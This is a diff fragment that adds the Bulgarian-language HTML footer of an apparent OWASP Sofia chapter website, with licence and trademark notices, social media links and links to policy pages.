+                <p style="margin-top: 12px; font-size: 0.8rem; opacity: 0.7; line-height: 1.7;">
+                    Всички OWASP материали са безплатни и достъпни под
+                    <a href="https://owasp.org/about/" target="_blank" rel="noopener">отворен лиценз</a>.
+                    OWASP не одобрява и не препоръчва комерсиални продукти или услуги, което позволява на общността
+                    да остане обективна и практична в областта на софтуерната сигурност.
+                </p>
+                <p style="margin-top: 10px; font-size: 0.75rem; opacity: 0.55; line-height: 1.7;">
+                    OWASP, логото на OWASP и Global AppSec са регистрирани търговски марки.
+                    AppSec Days, AppSec California, AppSec Cali, SnowFROC, OWASP Boston Application Security Conference
+                    и LASCON са търговски марки на OWASP Foundation, Inc.
+                </p>
+            </div>
+            <div style="text-align: right;">
+                <div class="footer-social" style="justify-content: flex-end; margin-bottom: 16px;">
+                    <a href="https://www.linkedin.com/company/107314221/" target="_blank" rel="noopener" title="LinkedIn">
+                        <svg class="icon-svg"><use href="#icon-linkedin"/></svg>
+                    </a>
+                    <a href="https://www.facebook.com/owaspbg" target="_blank" rel="noopener" title="Facebook">
+                        <svg class="icon-svg"><use href="#icon-facebook"/></svg>
+                    </a>
+                    <a href="https://discord.com/channels/849266967856414731/981867323298312223" target="_blank" rel="noopener" title="Discord">
+                        <svg class="icon-svg"><use href="#icon-discord"/></svg>
+                    </a>
+                    <a href="https://owasp.org/www-chapter-sofia/" target="_blank" rel="noopener" title="OWASP.org">
+                        &#127760;
+                    </a>
+                </div>
+                <div style="font-size: 0.8rem; display: flex; flex-direction: column; gap: 4px; align-items: flex-end;">
+                    <a href="https://owasp.org/www-policy/" target="_blank" rel="noopener">Политики</a>
+                    <a href="https://owasp.org/www-policy/operational/code-of-conduct" target="_blank" rel="noopener">Кодекс на поведение</a>
+                    <a href="https://owasp.org/www-policy/operational/privacy" target="_blank" rel="noopener">Поверителност</a>
+                </div>
+            </div>
+        </div>
+    </div>
+</footer>
+
+</body>
+</html>
